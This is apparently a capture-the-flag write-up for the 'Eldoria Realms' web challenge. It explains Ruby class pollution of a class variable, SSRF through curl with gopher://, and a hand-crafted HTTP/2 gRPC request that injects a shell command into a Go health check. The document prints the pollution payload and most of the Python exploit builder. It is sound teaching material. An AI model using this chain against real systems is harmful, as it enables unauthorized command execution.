# Eldoria Realms

> A portal that allows players of Eldoria to transport between realms, take on quests, and manage their stats. See if it's possible to break out of the realm to gather more info on Malakar's spells' inner workings.

**Difficulty:** Medium  
**Source Code:** Provided  
**Techniques used:** Ruby Class Pollution and gRPC crafted payload sent via gopher protocol (SSRF)

This was the second challenge that I completed. I skipped the easy ones, mainly because the [`cyber attack`](../cyber_attack/writeup-en.md) challenge left me traumatized. But this one also gave me some trouble. Well, let's start.

This challenge has two applications: a Ruby-based web application and a Go-based gRPC service. Initially, I spotted a major vulnerability in the Go gRPC a command injection found in `challenge/datastreamapi/app.go` within the `healthCheck` method:
```go
func healthCheck(ip string, port string) error {
	cmd := exec.Command("sh", "-c", "nc -zv "+ip+" "+port)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Health check failed: %v, output: %s", err, output)
		return fmt.Errorf("health check failed: %v", err)
	}

	log.Printf("Health check succeeded: output: %s", output)
	return nil
}
```

At first, I thought this would be straightforward, but quickly realized the Docker configuration only exposed port 1337 (the web application). This hinted at an SSRF vulnerability.

After some investigation, I found the `/connect-realm` endpoint in `challenge/eldoria_api/app.rb`, which executes the `curl` command. No surprise there, the URL variable was sanitized and hardcoded:
```ruby
get "/connect-realm" do
	content_type :json
	if Adventurer.respond_to?(:realm_url)
		realm_url = Adventurer.realm_url
		begin
			uri = URI.parse(realm_url)
			stdout, stderr, status = Open3.capture3("curl", "-w", "%{http_code}", uri)
			puts stderr
			{ status: "HTTP request made", realm_url: realm_url, response_body: stdout }.to_json
		rescue URI::InvalidURIError => e
			{ status: "Invalid URL: #{e.message}", realm_url: realm_url }.to_json
		end
	else
		{ status: "Failed to access realm URL" }.to_json
	end
end
```

I spent a lot of time trying to find a way to exploit the SSRF. Initially, I didn't read all the `app.rb` carefully and missed the most crucial part. And is here in this class:
```ruby
class Adventurer
	@@realm_url = "http://eldoria-realm.htb"

	attr_accessor :name, :age, :attributes

	def self.realm_url
		@@realm_url
	end

	def initialize(name:, age:, attributes:)
		@name = name
		@age = age
		@attributes = attributes
	end

	def merge_with(additional)
		recursive_merge(self, additional)
	end

	def inspect
		vars = instance_variables.map do |var|
		  value = instance_variable_get(var)
		  "#{var}: #{value.inspect}"
		end.join(", ")
		"#<#{self.class} #{vars}>"
	end

	private

	def recursive_merge(original, additional, current_obj = original)
    additional.each do |key, value|
      if value.is_a?(Hash)
        if current_obj.respond_to?(key)
          next_obj = current_obj.public_send(key)
          recursive_merge(original, value, next_obj)
        else
          new_object = Object.new
          current_obj.instance_variable_set("@#{key}", new_object)
          current_obj.singleton_class.attr_accessor key
        end
      else
        current_obj.instance_variable_set("@#{key}", value)
        current_obj.singleton_class.attr_accessor key
      end
    end
    original
  end
end
```

As you might have guessed, the `recursive_merge` method is vulnerable to class pollution, allowing indirect manipulation of class-level state, such as the `@@realm_url` variable, via object pollution.

After reading an amazing post written by [Raúl Miján](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html), titled _"Class Pollution in Ruby: A Deep Dive into Exploiting Recursive Merges"_, which you should read too. I was able to complete the first step and create the payload:
```json
{
   "class":{
      "superclass":{
          "realm_url":"any_url_here"
      }
   }
}
```

Sending this payload via POST to `/merge-fates` updates the `@@realm_url` in the `Adventurer` class, exploiting the SSRF vulnerability in the `/connect-realm` endpoint.

At this point, I had almost everything needed to complete the challenge:

- **Ruby Class Pollution** to manipulate the `@@realm_url` class variable.
- **Command Injection** vulnerability in the gRPC server.

Almost perfect. Now I just needed a way to chain these two vulnerabilities. 

---
## Crafting gRPC + HTTP/2 + GOPHER://

After countless hours of research, and with the help of my friend Gpeto (a.k.a. ChatGPT) and his powerful brain, I found a way: manually crafting an HTTP/2 request along with the gRPC payload and sending it via **gopher** protocol.

But to achieve this, we'll need to dive deeper into HTTP/2's internal structure.
### HTTP/2 structure

HTTP/2 uses binary frames with a fixed 9-byte header followed by payload:

| Field             | Size     | Description                             |
| ----------------- | -------- | --------------------------------------- |
| Length            | 3 bytes  | Payload length (big-endian)             |
| Type              | 1 byte   | Frame type (e.g., HEADERS, DATA, etc.)  |
| Flags             | 1 byte   | Control flags (END_HEADERS, etc.)       |
| Stream Identifier | 4 bytes  | Unique stream ID (client starts with 1) |
| Payload           | Variable | Frame content (depends on type)         |

**Structure**
1. Before any binary frames are sent, the client must send a clear-text **connection preface**:  `PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n`
2. **Settings Frame** 
    - **Type**: `0x04`
    - **Flags**: `0x00`
    - **Stream ID**: `0x00000000`
    - **Payload**:
        - **Key**: `0x3 = SETTINGS_MAX_CONCURRENT_STREAMS`
        - **Value**: `100`
3. **Headers Frame**
    - **Type**: `0x01`
    - **Flags:**
        - `0x04 = END_HEADERS`
        - `0x05= END_HEADERS + END_STREAM`
    - **Stream ID**: `0x00000001`
    - **Payload**: must be encoded with `Hpack`
        - `':method', 'POST'` 
        - `':scheme', 'http'`             
        - `':path', '/live.LiveDataService/CheckHealth'`             
        - `':authority', 'localhost:50051'`             
        - `'content-type', 'application/grpc'`             
        - `'te', 'trailers'`  
4. **Data Frame**            
    - **Type**: `0x00`        
    - **Flags**: `0x01 = END_STREAM`        
    - **Stream ID**: Same as in the `HEADERS` frame. In this case `0x00000001`         
    - **Payload**: `<binary of the data>`

> **Note:** Every HTTP/2 frame starts with a 9-byte header. The first **3 bytes** define the length of the payload (in big-endian format).  If the frame has no payload, the length is set to zero `00 00 00`


With all this in place, the frames should look something like this:
`<length of data><type><flags><stream ID><payload>`

And the full request sent to the server:
`<preface><SETTINGS frame><HEADERS frame><DATA frame>`

### gRPC Structure

The gRPC message consists of the following structure:
- **1-byte Compression Flag:
	- `0x00` indicates no compression
	- `0x01` indicates compression enabled
- **4-byte Message Length** (big-endian): Specifies the length of the serialized message.
- **Serialized gRPC Message**: The actual payload, encoded using Protocol Buffers (protobuf).    

Here's what it should look like:
`<Compression Flag><Message Length><Serialized payload>`

### Exploit

Now that we have all the pieces, it's time to put them together in some Python code.

We start by building the **SETTINGS frame**, where we define the `SETTINGS_MAX_CONCURRENT_STREAMS` with a value of 100. I'm not sure why, but according to the documentation the settings frame can be empty. However, when I tried that, I got the following error: `GET / HTTP/1.1 [Malformed Packet]Continuation`.
Probably because I was crafting the frame incorrectly, but after adding `SETTINGS_MAX_CONCURRENT_STREAMS` everything worked fine.
```python
def get_settings_frame():
	settings = [
		(0x3, 100)
	]
	settings_payload = b''.join(struct.pack('!HI', k, v) for k, v in settings)
	settings_header = len(settings_payload).to_bytes(3, 'big') + b'\x04\x00' + b'\x00\x00\x00\x00'
	return settings_header + settings_payload
```

Next, we craft the **HEADERS frame**, using the `hpack` encoder to properly format all the required headers:
```python
def get_headers_frame():
	encoder = Encoder()
	headers = [
		(':method', 'POST'),
		(':scheme', 'http'),
		(':path', '/live.LiveDataService/CheckHealth'),
		(':authority', 'localhost:50051'),
		('content-type', 'application/grpc'),
		('te', 'trailers'),
	]
	encoded_headers = encoder.encode(headers)

	headers_header = len(encoded_headers).to_bytes(3, 'big') + b'\x01\x04' + b'\x00\x00\x00\x01'
	return headers_header + encoded_headers
```

Now let's craft the **gRPC payload**. For this step, we need to use the stubs generated from the `.proto` file. 

>You can generate them using the following command: `python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. live_data.proto`

We'll inject the command in the `port` field, which is where the vulnerability lies:
```python
def get_grpc_frame(ip: str, port: str):
	request = live_data_pb2.HealthCheckRequest(ip=ip, port=port)
	grpc_payload = request.SerializeToString()

	return b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload
```

Finally, we put everything together into a binary payload and write it to a file, or just generate the `gopher://` payload directly.

Here, I saved the request to a file and read it later to generate the payload. Honestly, I only did it this way because I had code already working from previous tests, and I was too lazy to change it.
```python
grpc_frame = get_grpc_frame("127.0.0.1", ';' + args.cmd)
data_header = len(grpc_frame).to_bytes(3, 'big') + b'\x00\x01' + b'\x00\x00\x00\x01'
data_frame = data_header + grpc_frame

with open("grpc_request.bin", "wb") as f:
	f.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")  # HTTP/2 connection preface
	f.write(get_settings_frame())
	f.write(get_headers_frame())
	f.write(data_frame)
```


With the payload ready, all that's left is to URL-encode it, prepend `gopher://`, send it to `/connect-realm`, and retrieve the flag.
![Flag](imgs/flag.png)